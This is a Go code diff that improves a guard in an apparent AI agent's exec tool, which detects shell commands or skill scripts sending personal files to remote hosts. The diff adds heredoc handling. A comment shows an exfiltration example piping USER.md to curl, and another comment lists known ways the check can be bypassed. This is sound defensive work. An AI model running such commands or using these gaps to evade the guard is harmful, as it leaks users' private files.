@@ -44,8 +44,8 @@ const (
 // asking, and some models follow a skill step by step. A file counts as sent
 // only when the same command, or the skill script it runs, reaches another
 // host and does not merely write the file.
-// shortcut: it reads each command on its own and only the scripts of skills, so code that splits the
-// address and the file over lines, a script reached after a cd, or a copy sent by a later command passes;
+// shortcut: it reads each command on its own and only the scripts of skills, so code that builds the
+// address or the path at run time, a script reached after a cd, or a copy sent by a later command passes;
 // upgrade to a network policy for skill scripts then.
 func (t *ExecTool) personalFilesSentTo(command, cwd string) string {
 	for _, unit := range commandUnits(command) {
@@ -73,14 +73,16 @@ func remoteDestination(text string) string {
 }
 
 // commandUnits splits a command where one command ends and the next begins:
-// an unquoted `;`, `&&` or `||`, or a new line the shell does not continue
-// with a backslash. A pipeline stays whole, since `cat USER.md | curl -d @- host`
-// sends what the first stage reads.
+// an unquoted `;`, `&&` or `||`, or a new line the shell does not continue with
+// a backslash. A pipeline stays whole, since `cat USER.md | curl -d @- host`
+// sends what the first stage reads; so does a new line inside quotes, and a
+// heredoc body, which is the input of the command that opens it.
 func commandUnits(command string) []string {
 	var units []string
 	var unit strings.Builder
 	runes := []rune(lineContinuation.Replace(command))
 	quote := rune(0)
+	var heredocs []heredoc
 	cut := func() {
 		units = append(units, unit.String())
 		unit.Reset()
@@ -88,16 +90,24 @@ func commandUnits(command string) []string {
 	for i := 0; i < len(runes); i++ {
 		r := runes[i]
 		switch {
-		case r == '\n':
-			quote = 0
-			cut()
-			continue
 		case quote != 0:
 			if r == quote {
 				quote = 0
 			}
 		case r == '\'' || r == '"':
 			quote = r
+		case r == '<' && i+2 < len(runes) && runes[i+1] == '<' && runes[i+2] != '<':
+			if doc, ok := readHeredoc(runes[i+2:]); ok {
+				heredocs = append(heredocs, doc)
+			}
+		case r == '\n':
+			unit.WriteRune(r)
+			for _, doc := range heredocs {
+				i = doc.appendBody(runes, i+1, &unit) - 1
+			}
+			heredocs = nil
+			cut()
+			continue
 		case r == ';':
 			cut()
 			continue
@@ -110,6 +120,56 @@ func commandUnits(command string) []string {
 	}
 	cut()
 	return units
+}
+
+// heredoc is a `<<WORD` or `<<-WORD` the command opened.
+type heredoc struct {
+	delimiter string
+	stripTabs bool
+}
+
+// readHeredoc reads the delimiter that follows `<<`, quoted or bare.
+func readHeredoc(rest []rune) (heredoc, bool) {
+	doc := heredoc{}
+	i := 0
+	if i < len(rest) && rest[i] == '-' {
+		doc.stripTabs = true
+		i++
+	}
+	for i < len(rest) && (rest[i] == ' ' || rest[i] == '\t') {
+		i++
+	}
+	var word strings.Builder
+	for ; i < len(rest) && !strings.ContainsRune(" \t\n;&|<>()", rest[i]); i++ {
+		if rest[i] != '\'' && rest[i] != '"' && rest[i] != '\\' {
+			word.WriteRune(rest[i])
+		}
+	}
+	doc.delimiter = word.String()
+	return doc, doc.delimiter != ""
+}
+
+// appendBody writes the heredoc's lines, from start through the delimiter
+// line, to unit as they are (no quotes are tracked in data), and returns where
+// the next line begins. A body that never closes runs to the end.
+func (doc heredoc) appendBody(runes []rune, start int, unit *strings.Builder) int {
+	for start < len(runes) {
+		end := start
+		for end < len(runes) && runes[end] != '\n' {
+			end++
+		}
+		line := string(runes[start:end])
+		unit.WriteString(line)
+		unit.WriteByte('\n')
+		start = end + 1
+		if doc.stripTabs {
+			line = strings.TrimLeft(line, "\t")
+		}
+		if line == doc.delimiter {
+			break
+		}
+	}
+	return start
 }
 
 // lineContinuation joins what the shell runs as one line.
